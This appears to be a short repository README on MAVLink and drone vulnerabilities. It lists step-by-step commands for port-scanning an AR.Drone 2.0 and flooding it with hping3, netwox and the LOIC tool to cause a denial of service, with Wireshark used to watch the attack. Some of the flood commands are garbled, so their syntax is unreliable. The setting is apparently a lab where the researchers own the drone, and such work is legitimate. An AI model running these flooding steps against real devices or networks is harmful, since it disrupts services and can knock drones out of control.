# MAVLink-security34
This reposity display information related to MAVLink related vulnerabilities.
Wireshark - The network monitor used to check if the attack is being done. Please, execute the set of commands below on the Linux terminal: 

- Run “sudo apt-get install wireshark” 
- Run using "sudo wireshark" otherwise it will not be able to access the network card 
- Choose wlan1 and press start and you will be able to see the network packet flow

Nmap - Nmap scans the open ports on the Internet Protocol (IP) address. Please, execute the set of commands below on the Linux terminal:

- Run "sudo apt-get install nmap"
- Run "nmap IP address"
- Where "192.168.1.1" is the IP of the AR.Drone 2.0

Hping3 - Hping3 is a DoS attack tool. Please, execute the set of commands below on the Linux terminal:

- Run "sudo apt-get update"
- Run "sudo apt-get install hping3"
- Run "sudo hping3 -fast-flolo IP address"
- Where "192.168.1.1" is the IP of the AR.Drone 2.0

Netwox - Netwox is a DoS attack tool. Please, execute the set of commands below on the Linux terminal:

- Run "sudo apt-get install netwox"
- Run "netwox 76 -dst-ip IP address -dst-port 21"
- Where "192.168.1.1" is the IP of the AR.Drone 2.0
- Where "21" is the destination port

LOIC - LOIC is an interface tool that facilitates a DoS or DDoS attack. Please, following the instructions below: 

- Run "sudo apt-get install monodevelop" on Linux terminal
- Clone on Linux terminal https://github.com/NewEraCracker/LOIC/releases
- Download the binary file and the executable, and add in the folders
- To execute, enter in the folder of the LOIC tool by the Linux terminal and use the command "mono LOIC.exe"
- Put the IP of the AR.Drone 2.0 in the IP address field and press lock on
- Choose the destination port in the port field
- Choose the type of attack (TCP)
- Choose the speed and repetition settings
- Press start "IMMA CHARGIN WITH LEISURE" 
